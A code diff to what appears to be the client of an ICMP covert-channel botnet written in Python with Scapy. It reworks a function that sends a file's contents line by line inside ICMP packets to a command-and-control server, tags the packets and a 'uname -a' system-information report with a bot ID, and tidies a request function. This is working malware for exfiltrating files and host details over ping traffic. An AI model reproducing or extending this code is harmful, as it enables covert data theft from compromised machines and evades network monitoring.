@@ -43,6 +43,7 @@ def getId():
         cp.readfp(open('pingc.conf', 'r'))
         section = 'Main'
         id = cp.get(section,'id')
+	#print "[D] ID found: %s" % id
 	return id	
 
 def setId(botId):
@@ -56,19 +57,6 @@ def setId(botId):
         for option, value in options.items():
                 cp.set(section, option, value)
         cp.write(open('pingc.conf', 'w'))
-
-	#config = conf_file.read()
-	
-	#for line in fileinput.input(conf_file, inplace=1):
-        #	if 'id=' in line:
-	#		print "[D] Found id, changing to %s" % botId
-	#		curId = line[3:]
-         #   		line = line.replace(curId,botId)
-	#	elif 'checkedin' in line:
-	#		print "[D] Found checkedin, setting to true"
-	#		line = line.replace('checkedin=0','checkedin=1')
-	#		sys.stdout.write(line)
-	#conf_file.close()
 
 def active():
 	cp = SafeConfigParser()
@@ -84,40 +72,40 @@ def handler(signum, frame):
 def sendFile(filename,botId):
 	print "[*] Sending file: %s" % filename
 	file = open(filename, 'r')
-	startLine = '(FILE_START) ' + str(filename)
-	packet=IP(dst=sys.argv[1])/ICMP(id=int(botId))/startLine
+	startLine = '(FILE_START) ' + botId + ' ' + str(filename)
+	packet=IP(dst=sys.argv[1])/ICMP()/startLine
 	p=sr1(packet,timeout=1)
 	for line in file:
 		#print "[D] Sending line: %s" % line
-		sendLine = '(FILE) ' + filename + ' ' + line
-		packet=IP(dst=sys.argv[1])/ICMP(id=int(botId))/sendLine
+		sendLine = '(FILE) ' + botId + ' ' + filename + ' ' + line
+		packet=IP(dst=sys.argv[1])/ICMP()/sendLine
 		#send(packet)
 		#time.sleep(1)
 		p=sr1(packet,timeout=1)
 	print "[D] End of file"
-	finishLine = '(FILE_END) ' + str(filename)
-	packet=IP(dst=sys.argv[1])/ICMP(id=int(botId))/finishLine
+	finishLine = '(FILE_END) ' + botId + ' ' + str(filename)
+	packet=IP(dst=sys.argv[1])/ICMP()/finishLine
 	send(packet)
 
 	
-def sendPingRequest(command,botId):
+def sendPingRequest(request,botId):
+	full_request = request + ' ' + botId
 	if botId == 123456789:
 		# Initial Checkin request
-		packet=IP(dst=sys.argv[1])/ICMP()/str(command)
+		packet=IP(dst=sys.argv[1])/ICMP()/str(full_request)
 	else:
-		packet=IP(dst=sys.argv[1])/ICMP(id=int(botId))/str(command)
+		packet=IP(dst=sys.argv[1])/ICMP()/str(full_request)
         #packet.show()
-        print "[*] Request sent to C2 server: " + command
+        print "[*] Request sent to C2 server: " + request
 	try:
 		p=sr1(packet,timeout=10)
+		#p.show()
+		if p:
+                	return p
+        	else:
+                	return
         except:
 		print "[X] Error receiving packet"
-	#p.show()
-	if p:
-		return p
-	else:
-		return
-	
 
 def processReply(p):
 	try:
@@ -140,7 +128,7 @@ def processReply(p):
 		proc = sub.Popen(['uname -a'],stdout=sub.PIPE,stderr=sub.PIPE,shell=True)
                 output, errors = proc.communicate()
                 botId=getId()
-		sendRequest = 'sysinfo %s' % output
+		sendRequest = 'sysinfo %s %s' % (botId,output)
 		p=sendPingRequest(sendRequest, botId)
 		if p:	
 			processReply(p)
